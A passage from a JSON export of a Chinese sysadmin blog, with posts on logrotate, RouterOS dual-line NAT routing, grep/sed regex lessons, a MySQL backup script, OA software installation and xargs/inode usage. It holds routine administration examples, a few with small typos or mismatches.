以Nginx为例，是通过postrotate指令发送USR1信号来通知Nginx重新打开日志文件的。但是其他的应用程序不一定遵循这样的约定，比如说MySQL是通过flush-logs来重新打开日志文件的。更有甚者，有些应用程序就压根没有提供类似的方法，此时如果想重新打开日志文件，就必须重启服务，但为了高可用性，这往往不能接受。还好Logrotate提供了一个名为copytruncate的指令，此方法采用的是先拷贝再清空的方式，整个过程中日志文件的操作句柄没有发生改变，所以不需要通知应用程序重新打开日志文件，但是需要注意的是，在拷贝和清空之间有一个时间差，所以可能会丢失部分日志数据。 MySQL本身在support-files目录已经包含了一个名为mysql-log-rotate的脚本，不过它比较简单，更详细的日志轮转详见[「Rotating MySQL Slow Logs Safely」](https://engineering.groupon.com/2013/mysql/rotating-mysql-slow-logs-safely/)。 日志切割-错误案例123456789101112错误：error: skipping &quot;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;nginx_web.log&quot; because parent directory has insecure permissions (It&#39;s world writable or writable by group which is not &quot;root&quot;) Set &quot;su&quot; directive in config file to tell logrotate which user&#x2F;group should be used for rotation.原因：cd &#x2F;var&#x2F;log&#x2F;nginx&#x2F;ls -l可以看到，所有log日志文件属主属组是nginx-web, 权限都是777，这个777权限是非常危险的。这样的话logrotate就懵逼了，所有人都有权限操作，但logrotate不知道该用哪个用户去执行crontab定时切割指令。所以会报错。解决方案：不优雅的解决方案： vim &#x2F;etc&#x2F;logrotate.d&#x2F;nginx配置文件中，加入su root list ，即指定root用户去执行日志切割。优雅的解决方案：你需要去思考，为什么之前是没有问题的？参考方案可以是 @艾特所有php研发，对权限问题严谨性进行科普，拒绝此类事件再次发生。除此之外，将&#x2F;var&#x2F;log&#x2F;nginx目录下的文件权限全部改为644. 文章参考 火灯笔记 Linux中国 ​","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"log","slug":"log","permalink":"https://garywu520.github.io/tags/log/"},{"name":"logrotate","slug":"logrotate","permalink":"https://garywu520.github.io/tags/logrotate/"},{"name":"日志","slug":"日志","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97/"},{"name":"切割","slug":"切割","permalink":"https://garywu520.github.io/tags/%E5%88%87%E5%89%B2/"}]},{"title":"RouterOS多线NAT问题处理","slug":"RouterOS多线NAT问题处理","date":"2017-06-05T11:21:19.000Z","updated":"2017-06-06T11:04:20.471Z","comments":true,"path":"2017/06/05/RouterOS多线NAT问题处理/","link":"","permalink":"https://garywu520.github.io/2017/06/05/RouterOS%E5%A4%9A%E7%BA%BFNAT%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/","excerpt":"路由拓扑说明公司原有线路是双光纤，一条主线【联通80M】，另一条是辅助线路【鹏博士20M】。联通80M为默认路由，鹏博士20M为策略路由（即指定的部分IP上网才能使用鹏博士流量）。 没有做流量从那条线进来就从哪条线出去的相关规则，NAT配置在了鹏博士光纤上，一切正常，就这样运行了1年。","text":"路由拓扑说明公司原有线路是双光纤，一条主线【联通80M】，另一条是辅助线路【鹏博士20M】。联通80M为默认路由，鹏博士20M为策略路由（即指定的部分IP上网才能使用鹏博士流量）。 没有做流量从那条线进来就从哪条线出去的相关规则，NAT配置在了鹏博士光纤上，一切正常，就这样运行了1年。 可是今年由于光纤质量原因，联通80M更换为了电信150M光纤，但切换默认路由到电信上面之后，故障发生了...原来绑定在鹏博士线路上的NAT设置全部失效。从外网访问不了我们公司的服务器NAT映射。为了这个问题，我把两家公司的技术全都请来了，都说自家网没有问题...好吧，在和电信技术沟通画拓扑的时候，灵感一现，问题解决了... 解决步骤1. 配置两条线的策略路由 即，流量从哪儿来，就从哪儿出去 2. 配置NAT流量走向 让需要映射的内网服务器IP到公网映射端口的流量，走鹏博士 配置两条线的流量策略路由 从哪儿进来就从哪儿出去，即：流量从电信过来就从电信线路接口出去；从鹏博士进来的流量，就从鹏博士线路接口出去 说明：Ether3: 电信接口 ; Ether1: 鹏博士接口 /ip firewall mangle ##电信-进来的流量标记，名称: dianxin_conn chain=input action=mark-connection new-connection-mark=dianxin_conn passthrough=yes in-interface=ether3 log=no log-prefix=&quot;&quot; ##电信-出去的路由标记, 名称: dianxin_routing chain=output action=mark-routing new-routing-mark=dianxin_markrouting passthrough=yes connection-mark=dianxin_conn log=no log-prefix=&quot;&quot; ##鹏博士-进来的流量标记, 名称: pengboshi_conn chain=input action=mark-connection new-connection-mark=pengboshi_conn passthrough=yes connection-state=new in-interface=ether1 ##鹏博士-出去的路由标记, 名称: pengboshi_routing chain=output action=mark-routing new-routing-mark=pengboshi_routing passthrough=yes connection-mark=pengboshi_conn 注意：Mangle里面有严格的前后关系，务必把这四条策略，放到mangle列表的最顶端。 做完上面的标记后，接下来应用路由策略，流量各走各的,如下： /ip route ##电信进出流量 dst-address=0.0.0.0/0 gateway=电信网关IP routing-mark=dianxin_routing ##鹏博士进出流量 dst-address=0.0.0.0/0 gateway=鹏博士网关IP routing-mark=pengboshi_routing 配置NAT端口映射流量走向##到Ros的端口为TCP22且通过鹏博士接口进来的流量标记一个连接，名字为Gitlab22_conn chain=prerouting action=mark-connection new-connection-mark=Gitlab22_conn passthrough=yes protocol=tcp in-interface=ether1 dst-port=22 ##192.168.10.10内网服务器IP的22端口到鹏博士线路的流量做一个路由标记，名字为：Gitlab22_routing chain=prerouting action=mark-routing new-routing-mark=Gitlab22_routing passthrough=no src-address=192.168.10.10 connection-mark=Gitlab22_conn 注：这里一定要填写内网IP，让这个服务器出Ros的数据被标记出来，由鹏博士线路出去，形成往来数据流向环。否则就会出现无法访问NAT端口映射了，这就是为什么内网服务器只能主线电信访问（默认路由），而辅助线路鹏博士（策略路由）无法访问。上面这两条规则解决了这个问题。 ## 应用这个NAT策略路由 dst-address=0.0.0.0/0 gateway=鹏博士网关IP routing-mark=Gitlab22_routing OK，到这里，NAT公网映射两条线都可以从外网进来访问服务器了，当然，你如果有其他NAT映射，也需要重复上面3条命令 文档参考：完美解决Ros多线NAT映射问题 思考我们回归问题本身，为什么联通【默认路由主线】和电信通【策略路由辅助线路】，当初没有出现这个问题呢？为什么把主线从联通切换到电信NAT就出现了故障？ 笔者分析如下： 一个大胆的猜测，鹏博士光纤的上层链路与联通链路有关联，当外部访问内网NAT映射时，首先到达且使用联通流量，联通判断该请求目的地是鹏博士公网IP，对此请求进行了转发。而电信这么过来的时候，直接把这个数据包给丢弃了，所以就无法访问。我们无法求证具体原因，但上面的操作绝对是最正确的，尤其是出现在双线或者多线的企业网络环境中。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"NAT","slug":"NAT","permalink":"https://garywu520.github.io/tags/NAT/"},{"name":"双线","slug":"双线","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E7%BA%BF/"}]},{"title":"老男孩37期-第6节课-正则表达式和通配符","slug":"老男孩37期-第6节课-正则表达式和通配符","date":"2017-06-03T11:11:52.000Z","updated":"2017-06-09T03:32:34.208Z","comments":true,"path":"2017/06/03/老男孩37期-第6节课-正则表达式和通配符/","link":"","permalink":"https://garywu520.github.io/2017/06/03/%E8%80%81%E7%94%B7%E5%AD%A937%E6%9C%9F-%E7%AC%AC6%E8%8A%82%E8%AF%BE-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6/","excerpt":"上节课回顾-命令补充回顾 ls -li与ls -lhi的区别 ls -lrt","text":"上节课回顾-命令补充回顾 ls -li与ls -lhi的区别 ls -lrt 特殊符号通配符 简单理解为键盘上除了字母和数字之外的特殊符号，称为通配符 * 匹配任意文本/字符串，例：*.txt 、*.log等 &#123;&#125; 用于生成序列。花括号里面以逗号分隔，且不能有空格 $ 取变量的值 ·· （Esc键下边）反引号 | 管道 ; 用于分隔，比如：ls -l ;pwd (前面执行失败，后面依然执行) &amp;&amp; 用于分隔，比如：ls -l &amp;&amp; pwd(前面执行成功，才会执行后面的命令) * （星号示例）ls -l *.log *.txt 查找后缀为log和txt的文件 ls -l stu* 查找以stu开头的文件 cat stu* 查看stu开头文件的内容 ls -l stu*.txt 查看stu开头并且以txt结尾 {} （花括号示例）[root@oldboy202 20170118]# echo &#123;1..5&#125; 1 2 3 4 5 [root@oldboy202 20170118]# echo &#123;5..1&#125; 5 4 3 2 1 [root@oldboy202 20170118]# echo &#123;1..5&#125; &#123;a..z&#125; 1 2 3 4 5 a b c d e f g h i j k l m n o p q r s t u v w x y z [root@oldboy202 20170118]# echo A&#123;B,C,D&#125; AB AC AD [root@oldboy202 20170118]# echo 2&#123;2,3,4&#125; 22 23 24 [root@oldboy202 20170118]# echo &#123;1,3,5&#125; 1 3 5 echo stu&#123;0..5&#125; 工作中常用 示例：创建 stu01.txt 到stu05.txt[root@oldboy202 ~]# touch stu&#123;01..5&#125;.txt [root@oldboy202 ~]# ls stu*.txt stu01.txt stu02.txt stu03.txt stu04.txt stu05.txt 使用花括号进行备份公式： echo A&#123;B,C&#125; 意思是结果粘在一起 AB AC echo A&#123;,C&#125; A AC 备份 cp oldboy.txt&#123;,.bak&#125; 这条命令就等于执行 cp oldboy.txt oldboy.txt.bak 单引号、双引号与不加引号区别单引号：吃啥吐啥 [root@oldboy202 ~]# echo &#39;$(which mkdir) &#123;a..z&#125;&#39; $(which mkdir) &#123;a..z&#125; 双引号：不支持通配符 [root@oldboy202 ~]# echo &quot;$(which mkdir) &#123;a..z&#125;&quot; /bin/mkdir &#123;a..z&#125; 不加引号： [root@oldboy202 ~]# echo $(which mkdir) &#123;a..z&#125; /bin/mkdir a b c d e f g h i j k l m n o p q r s t u v w x y z ​​ 基本正则表达式 为处理大量文本/字符串而定义的一套规则和方法，以行为单位处理 正则表达式- regular expression（RE） 正则表达式与通配符区别: 正则表达式是在文件中查找内容，而通配符一般是查找匹配文件 查找内容的时候，匹配的内容显示颜色 grep --color=auto 3306 /etc/services 正则别名定义 - 准备-环境alias egrep=&#39;egrep --color=auto&#39; alias grep=&#39;grep --color=auto&#39; cat &gt;&gt;/etc/profile&lt;&lt;EOF alias egrep=&#39;egrep --color=auto&#39; alias grep=&#39;grep --color=auto&#39; EOF source /etc/profile 正则表达式分为2种1 基本正则表达式（BRE，basic regular expression） 2 高级功能:扩展正则表达式（ERE，extended regular expression） 基本正则表达式-环境准备cat oldboy.txt I am oldboy teacher! I teach linux. I like badminton ball ,billiard ball and chinese chess! my blog is http://oldboy.blog.51cto.com our site is http://www.etiantian.org my qq num is 49000448. not 4900000448. my god ,i am not oldbey,but OLDBOY! 基本正则表达式^ 尖角号 找以什么开头的行 示例：grep &quot;^my&quot; oldboy.txt //查找以my开头的行 $ 找以什么结尾的行 示例： grep &quot;m$&quot; oldboy.txt ^$ 表示找空行，这一行什么都没有（不是空格） 示例： grep -n &quot;^$&quot; oldboy.txt 3: 8: 注：-n 参数意思是添加行号 PS：cat -A oldboy.txt 查看文件空行，空格以$显示 . (点) 这个正则表达式，一次可以找到任意1个字符 PS： grep -o “.” oldboy.txt 显示grep 1次找到了什么内容通常与 grep -o “.*” oldboy.txt 一般这么使用，查看找到的所有内容 示例1：如果我忘了中间是什么字符，如何匹配查找？ [root@oldboy202 ~]# grep &quot;oldb.y&quot; oldboy.txt I am oldboy teacher! my blog is http://oldboy.blog.51cto.com my god ,i am not oldbey,but OLDBOY! 示例2：查找以小数点 “.” 结尾的行 [root@oldboy202 ~]# grep &quot;\\.$&quot; oldboy.txt I teach linux. my qq num is 49000448. not 4900000448. 因为.在三剑客有特殊含义，所以需要转义，需要用到\\ ​ \\ 撬棍，转义使用 示例3：查找以“//” 开头的行 [root@oldboy202 ~]# egrep &quot;\\/\\/&quot; oldboy.txt my blog is http://oldboy.blog.51cto.com our site is http://www.etiantian.org ​​ 0* 表示数字0连续出现了0次或多次 0* 另外一个意思表示连续出现0次的时候，什么都没有,代表空 示例：grep “0*” oldboy.txt 等同于 grep “” oldboy.txt 0* 表示连续出现多次的时候，就会把 000 00000都取出来。 grep -o &quot;0*&quot; oldboy.txt //查看grep如何去查找连续 000 00000 正则表达式的连续是指从0作为起始，1次以上（含1次）即视为多次 .* 匹配文本*前面任意字符的所有内容 示例1： grep -on &quot;.*&quot; oldboy.txt 示例2： grep &quot;^.*o&quot; oldboy.txt 查找以任1个字符开头且包含o的行 表示连续或重复的时候，正则会匹配的更多 示例： [root@oldboy202 ~]# grep -no &quot;^.*e&quot; oldboy.txt 1:I am oldboy teache 2:I te 4:I like badminton ball ,billiard ball and chinese che 6:our site is http://www.e 10:my god ,i am not oldbe [root@oldboy202 ~]# grep &quot;^.*e&quot; oldboy.txt I am oldboy teacher! I teach linux. I like badminton ball ,billiard ball and chinese chess! our site is http://www.etiantian.org my god ,i am not oldbey,but OLDBOY! [root@oldboy202 ~]# egrep &quot;.*g.*$&quot; oldboy.txt my blog is http://oldboy.blog.51cto.com our sigte is http://www.etiantian.org my god ,i am not oldbey,but OLDBOY! ^.* 从头匹配所有，直到指定字符结束 示例： [root@oldboy202 ~]# grep &quot;^.*b&quot; oldboy.txt I am oldboy teacher! I like badminton ball ,billiard ball and chinese chess! my blog is http://oldboy.blog.51cto.com my god ,i am not oldbey,but OLDBOY! [abc] 匹配字符集合，正则将其视为一个整体，匹配A或匹配B或匹配C [A-Z]匹配大小写字母 [a-z] [0-9]匹配数字 示例： grep &quot;[b]&quot; oldboy.txt grep -no &quot;[abc]&quot; oldboy.txt grep &quot;[A-Z]&quot; oldboy.txt grep &quot;[1-9a-zA-Z]&quot; oldboy.txt 示例： 找以大写字母开头的行 grep &quot;^[A-Z]&quot; oldboy.txt 找以小写字母结尾的行 grep &quot;[a-z]$&quot; oldboy.txt 练习： 找以m或n或o开头的 并且以m或g结尾的行？ 方法1： [root@oldboy202 ~]# grep &quot;^[mno]&quot; oldboy.txt |grep &quot;[mg]$&quot; my blog is http://oldboy.blog.51cto.com our site is http://www.etiantian.org 方法2： [root@oldboy202 ~]# grep &quot;^[mno].*[mg]$&quot; oldboy.txt my blog is http://oldboy.blog.51cto.com our site is http://www.etiantian.org [^abc] 匹配不包含^后面的字符，其他字符都要 grep &quot;[^abc]&quot; oldboy.txt 练习：找出除了m或n开头的行 [root@oldboy202 ~]# grep &quot;^[^mn]&quot; oldboy.txt I am oldboy teacher! I teach linux. I like badminton ball ,billiard ball and chinese chess! our site is http://www.etiantian.org 扩展1: 查找模糊字符串 [root@oldboy202 ~]# grep &quot;old.*y&quot; oldboy.txt I am oldboy teacher! my blog is http://oldboy.blog.51cto.com my god ,i am not oldbey,but OLDBOY! 扩展2：grep -v 与[^abc]区别 grep -v 排除掉某行 [^abc] 排除掉a或b或c 示例：grep -v &quot;[mn]&quot; oldboy.txt 扩展正则表达式 命令：egrep 或grep -E +（加号） 前一个字符连续出现了1个或多个 注：正则里面加号1次就认为是多次 示例： [root@oldboy202 ~]# egrep &quot;0+&quot; oldboy.txt my qq num is 49000448. not 4900000448. 查看egrep是如何查找的？ [root@oldboy202 ~]# egrep -o &quot;0+&quot; oldboy.txt 000 00000 示例：查找连续小写字母取出来(注：取的是连续的字符) [root@oldboy202 ~]# egrep &quot;[a-z]+&quot; oldboy.txt I am oldboy teacher! I teach linux. | 管道在正则里面意思是“或者” 示例1：egrep &quot;3306|1521&quot; /etc/services 示例2：找出my或者oldboy取出来 [root@oldboy202 ~]# egrep &quot;my|oldboy&quot; oldboy.txt I am oldboy teacher! my blog is http://oldboy.blog.51cto.com 示例3：找出dumpe2fs /dev/sda1结果中的inode size和inode count dumpe2fs /dev/sda1 |egrep -i &quot;inode size|innode count&quot; () 小括号，正则里面表示一个整体 示例1：取出oldboy和oldbey [root@oldboy202 ~]# egrep &quot;oldb(o|e)y&quot; oldboy.txt I am oldboy teacher! my blog is http://oldboy.blog.51cto.com my god ,i am not oldbey,but OLDBOY! 示例2：找出good和glad [root@oldboy202 ~]# egrep &quot;g(oo|la)d&quot; a.log good glad ? 问号，重复前面的字符0次或1次 示例： [root@oldboy202 ~]# egrep &quot;go?d&quot; a.log gd god a&#123;n,m&#125; 重复前面的字符n到m次 a&#123;n,&#125; 重复前面最少n次 a&#123;,m&#125; 重复前面最多n次 示例1： [root@oldboy202 ~]# egrep -o &quot;0&#123;1,3&#125;&quot; oldboy.txt 000 000 00 示例2： [root@oldboy202 ~]# egrep &quot;0&#123;3,4&#125;&quot; oldboy.txt my qq num is 49000448. not 4900000448. 查看其匹配工作情况 [root@oldboy202 ~]# egrep -o &quot;0&#123;3,4&#125;&quot; oldboy.txt 000 0000 ​ egrep 和 sed -r 支持扩展正则 awk直接支持扩展正则 转义字符（了解） \\b \\n 测试题利用sed取出eth0的IP地址？第一步：定位 第二步：取内容 ifconfig eth0|sed -n &#39;2p&#39; ifconfig eth0 |grep &quot;inet addr&quot; 正则方法1(掐头去尾法)：取IP地址 [root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed &#39;s#^.*addr:##g&#39;|sed &#39;s#Bc.*$##g&#39; 10.0.0.202 取出Bcast地址 [root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed &#39;s#^.*ast:##g&#39; |sed &#39;s#Mask.*$##g&#39; 10.0.0.255 正则方法2 取IP [root@oldboy202 ~]# ifconfig eth0 |sed -n &#39;2p&#39; |sed -r &#39;s#^.*dr:|Bc.*$##g&#39; 10.0.0.202 取Bcast地址 [root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed -r &#39;s#^.*ast:|Mask.*$##g&#39; 10.0.0.255 注：sed -r 使用扩展正则 | 表示或者 正则方法3 反向引用-预备知识：保留谁就括谁 [root@oldboy202 ~]# echo 123456 |sed -r &#39;s#..(..)..#\\1#g&#39; 34 [root@oldboyedu37-nb 20170118]# echo 123456|sed -r &#39;s#.(.).(.)..#\\1 \\2#g&#39; 2 4 [root@oldboyedu37-nb 20170118]# echo 123456|sed -r &#39;s#.(.).(.)..#\\2 \\1 \\2 \\2 \\2 #g&#39; 4 2 4 4 4 [root@oldboy202 ~]# echo 123456|sed -r &#39;s#.(...).#\\1#g&#39; 2346 注： 1.前面有多少个字符，就需要写几个点 2.后面的\\1是指前面括号里边的内容 利用反向引用，取出IP地址 [root@oldboy202 ~]# ifconfig eth0 |sed -n &#39;2p&#39; |sed -r &#39;s#^.*dr:(.*) Bc.*$#\\1#g&#39; 10.0.0.202 利用反向引用，取Bcast地址 [root@oldboy202 ~]# ifconfig eth0 |sed -n &#39;2p&#39; |sed -r &#39;s#^.*st:(.*) Ma.*$#\\1#g&#39; 10.0.0.255 正则方法4 对某一行进行字符串替换 格式：sed -n &#39;5#原内容#新内容#p&#39; filename 示例：替换oldboy.txt中第5行的oldboy为oldgirl sed -n &#39;5s#oldboy#oldgirl#gp&#39; oldboy.txt ifconfig eth0|sed -nr &#39;2s#^.*dr:(.*) Bc.*$#\\1#gp&#39; 10.0.0.200 方法5:[root@oldboyedu37-nb 20170118]# ifconfig eth0 |grep &quot;Bcast&quot; |egrep -o &quot;[0-9.]+&quot; ​ 扩展1：sed文件内容替换sed -i.bak &#39;s#oldboy#oldgirl#g&#39; oldboy.txt 参数：-i.bak 表示修改文件的时候，先保存为oldboy.txt.bak 注：sed 使用-i参数并且标记完修改之前先备份的时候，如果要使用正则表达式，需要把sed -r参数放到前面，这样： sed -ri.bak &#39;s#old(b)oy#oldgirl\\1#g&#39; oldboy.txt 修改oldoy为oldgirl,同时把b保留下来 修改结果： my blog is http://oldgirlb.blog.51cto.com 扩展2：使用正则提取/etc/hosts权限 方法1： [root@oldboyedu37-nb 20170118]# stat /etc/hosts|sed -n &#39;4p&#39;|sed &#39;s#^.*(0##g&#39; |sed &#39;s#/.*$##g&#39; 644 正则方法2： [root@oldboy202 ~]# stat /etc/hosts | sed -n &#39;4p&#39; |sed -r &#39;s#^.* \\(0(.*)\\/.*$#\\1#g&#39; 644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0 [root@oldboy202 ~]# stat /etc/hosts | sed -n &#39;4p&#39; |sed -r &#39;s#^.* \\(0(.*)\\/-.*$#\\1#g&#39; 644 方法3： [root@oldboy202 ~]# stat /etc/hosts|sed -nr &#39;4s#^.*\\(0(.*)/-.*$#\\1#gp&#39; 644 方法4: [root@oldboy202 ~]# stat /etc/hosts |grep &quot;Uid&quot; |egrep -o &quot;[0-9]&#123;4&#125;&quot; 0644 扩展3：取消某个文件的空行方法1： [root@oldboy202 ~]# egrep -v &quot;^$&quot; oldboy.txt 方法2： [root@oldboy202 ~]# sed &#39;/^$/d&#39; oldboy.txt 方法3： [root@oldboy202 ~]# awk &#39;!/^$/&#39; oldboy.txt I am oldgirlb teacher! I teach linux. I like badminton ball ,billiard ball and chinese chess! 方法4： [root@oldboy202 ~]# grep &#39;^.&#39; oldboy.txt 方法5: [root@oldboy202 ~]# grep &quot;.$&quot; oldboy.txt 扩展4：取出文本前两列 [root@oldboy202 ~]# cat ett.txt |egrep &quot;ol+dbo+y&quot; oldboy olldboooy [root@oldboy202 ~]# cat ett.txt |egrep &quot;^o&quot; oldboy olldboooy [root@oldboy202 ~]# cat ett.txt |awk &#39;/ol+dbo+y/&#39; oldboy olldboooy date时间显示date + 以某种格式显示日期 date +%F 年月日 date +%F_%T 年月日时分秒 date %w 星期几,0表示周日 显示三天前日期date -d &quot;3day&quot; 显示3天后时间 ​ date -d “-3day” 显示3天前时间 date -d “-3hour” 显示3小时前时间 date -d “-3year” 显示3年之前时间 工作中常用方法: 备份的时候需要给文件名，命名。 date +%F -d &quot;-1day&quot; sed 正则123456789101112## 查找以f或m结尾的行[root@server1 oldboy]# sed -n &#39;&#x2F;f$\\|m$&#x2F;p&#39; oldboy2.txt my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comoldboy f## 查找除了以f或m结尾的行[root@server1 oldboy]# sed -n &#39;&#x2F;f$\\|m$&#x2F;!p&#39; oldboy2.txt I am oldboy teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!our site is http:&#x2F;&#x2F;www.etiantian.orgmy qq num is 49000448.","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"egrep","slug":"egrep","permalink":"https://garywu520.github.io/tags/egrep/"},{"name":"sed","slug":"sed","permalink":"https://garywu520.github.io/tags/sed/"},{"name":"awk","slug":"awk","permalink":"https://garywu520.github.io/tags/awk/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://garywu520.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"mysql备份脚本-rsync上传","slug":"mysql备份脚本-rsync上传","date":"2017-06-01T09:39:31.000Z","updated":"2017-06-01T09:42:55.535Z","comments":true,"path":"2017/06/01/mysql备份脚本-rsync上传/","link":"","permalink":"https://garywu520.github.io/2017/06/01/mysql%E5%A4%87%E4%BB%BD%E8%84%9A%E6%9C%AC-rsync%E4%B8%8A%E4%BC%A0/","excerpt":"脚本如下：#!/bin/sh # Comman: update OwnCloud Server # Database info","text":"脚本如下：#!/bin/sh # Comman: update OwnCloud Server # Database info DB_USER=&quot;root&quot; DB_PASS=&quot;passwd&quot; DATE=$(date +%Y%m%d) BIN_DIR=&quot;/usr/local/mysql/bin&quot; BCK_DIR=&quot;/opt/&quot; $&#123;BIN_DIR&#125;/mysqldump --opt -u$&#123;DB_USER&#125; -p$&#123;DB_PASS&#125; stfoa &gt; $&#123;BCK_DIR&#125;/oa_mysql_$&#123;DATE&#125;.sql cd $&#123;BCK_DIR&#125; /usr/bin/rsync -avzP oa_mysql_$&#123;DATE&#125;.sql eegs@192.168.10.12::eegs","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"脚本","slug":"脚本","permalink":"https://garywu520.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"免费OA/PB/CC部署","slug":"OA","date":"2017-05-31T10:10:40.000Z","updated":"2017-06-01T03:19:35.919Z","comments":true,"path":"2017/05/31/OA/","link":"","permalink":"https://garywu520.github.io/2017/05/31/OA/","excerpt":"前言常工作与互联网公司，会点儿其他有用的东西也是不错的选择。 你们家用的OA是免费的吗？ 你想脱颖而出成为公司公众人物？赶紧动手！O(∩_∩)O哈！","text":"前言常工作与互联网公司，会点儿其他有用的东西也是不错的选择。 你们家用的OA是免费的吗？ 你想脱颖而出成为公司公众人物？赶紧动手！O(∩_∩)O哈！ CentOS环境部署安装libstdc库 yum install libstdc++ -y 安装libstdc++.so.5（查找发现，libstdc++.so.5包含在安装包compat-libstdc++-33） yum install compat-libstdc++-33 -y 安装unzip解压工具 yum install unzip Gentoo环境部署（可选） 安装libstdc和unzip(自动化脚本需要) # emerge sys-libs/libstdc++-v3 （脚本已包含，可以不事先安装；或者注释掉install.sh脚本中的相关参数） # emerge --ask app-arch/unzip 上传所需源码包注：/usr/local/fuwushe目录需要新建，把以下源码包放到该目录 软件包有： F14.8_sp1_Linux64.zip //协同管理软件 jdk-7-linux-x64.tar.gz libstdc.zip mysql-5.2.0-falcon-alpha-linux-x86_64-glibc23.tar.gz install.sh //自动安装脚本，上传后赋予文件可执行权限 由于官方更新，最新源码包获取，访问：http://www.fuwushe.org/jsp/faq/question.jsp?page=faq&amp;id=linux-install-centos-64 编辑install.sh脚本由于我们下载的软件与官方网站上面的不一致，这就需要修改脚本中关于源码包名称的定义，改为我们手上有的。 最后执行脚本（自动安装全部）sh install.sh all 坑（注意） 如果你要安装老版本，可以去官方百度云下载指定版本：https://pan.baidu.com/share/home?uk=4247518932#category/type=0 安装脚本（install.sh）位置在程序解压目录中的install目录 官网http://www.fuwushe.org/","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"OA","slug":"OA","permalink":"https://garywu520.github.io/tags/OA/"},{"name":"PB","slug":"PB","permalink":"https://garywu520.github.io/tags/PB/"},{"name":"CC","slug":"CC","permalink":"https://garywu520.github.io/tags/CC/"}]},{"title":"xargs命令-总结","slug":"xargs命令-总结","date":"2017-05-31T03:04:02.000Z","updated":"2017-05-31T13:44:46.597Z","comments":true,"path":"2017/05/31/xargs命令-总结/","link":"","permalink":"https://garywu520.github.io/2017/05/31/xargs%E5%91%BD%E4%BB%A4-%E6%80%BB%E7%BB%93/","excerpt":"find命令查找/oldboy/free目录下以log结尾且大于1M的文件，并拷贝到/tmp/b目录中 xargs方法一： find /oldboy/free -type f -name &quot;*.log&quot; -size +1M |xargs cp -t /tmp/b/ 参数说明：-t参数 意思是告诉cp, /tmp/b是一个目录","text":"find命令查找/oldboy/free目录下以log结尾且大于1M的文件，并拷贝到/tmp/b目录中 xargs方法一： find /oldboy/free -type f -name &quot;*.log&quot; -size +1M |xargs cp -t /tmp/b/ 参数说明：-t参数 意思是告诉cp, /tmp/b是一个目录 xargs方法二： find /oldboy/free -type f -name &quot;*.log&quot; -size +1M |xargs -i cp &#123;&#125; /tmp/d xargs -i 和&#123;&#125; 结合，中括号可以理解为前面命令执行的结果，作为此命令的输入【-i参数，可以宽泛理解为数据传递】 范例1： 我要查找/oldboy目录下的“.bak”且大于1M的文件，并全部改名为“*.log” find /oldboy -type f -name &quot;*.log&quot; -size +1M |xarg -i mv &#123;&#125; &#123;&#125;.log 范例2：删除当前目录下的所有tmp文件 find ./ -type f -name &quot;*.tmp&quot; |xargs -i rm -rf &#123;&#125; 范例3：查找当前目录所有包含baidu关键词的json文件 find ./ -type f -name &quot;*.json&quot; |xargs grep baidu 范例4：删除/oldboy目录下的所有普通文件 find /oldboy -type f |xargs -i rm -rf &#123;&#125; ss命令 ss -lntup |grep sshd 查看服务对应端口或端口是否已经启用 -l 显示监听状态的套接字（sockets） -n 不解析服务名称 -t 仅显示tcp套接字 -u 仅显示udp套接字 -p 显示使用套接字的进程 inode一个非空文件至少占用一个inode和一个block inode 在一个文件系统分区里面，inode号码唯一 df -h 查看分区磁盘占用情况 df -i 查看分区inode占用 ls -li /etc/hosts 显示文件inode stat /etc/hosts 查看文件属性(包括inode、block、访问权限、G/Uid和修改时间等信息) [root@openvpn1 ~]# stat /etc/passwd File: `/etc/passwd&#39; Size: 1166 Blocks: 8 IO Block: 4096 regular file Device: fd00h/64768d Inode: 1183654 Links: 1 Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2017-05-30 17:37:01.130227361 +0800 Modify: 2017-03-08 13:42:06.234661626 +0800 Change: 2017-03-08 13:42:06.235662212 +0800 block用来存储实际数据，每个block的大小一般有1k、2k、4k 查看每个分区inode节点大小dumpe2fs /dev/sda3 |grep &quot;Block size&quot; dumpe2fs /dev/sda3 |grep -i &quot;block size&quot; dumpe2fs /dev/sda3 |grep &quot;Inode size&quot; dumpe2fs /dev/sda3 |grep -i&quot;inode size&quot; 假设，/dev/sda3是指系统的根分区 附件：grep命令 grep -i 找东西的时候不区分大小写（用法如上） 遇到磁盘空间不足怎么办？no-space-left-on-device 磁盘空间不足 磁盘空间不足，有三种情况： block满了 使用df -h查看剩余空间 inode满了 使用df -i 查看可用inode block进程占用 一般重启对应程序即可 真实案例： 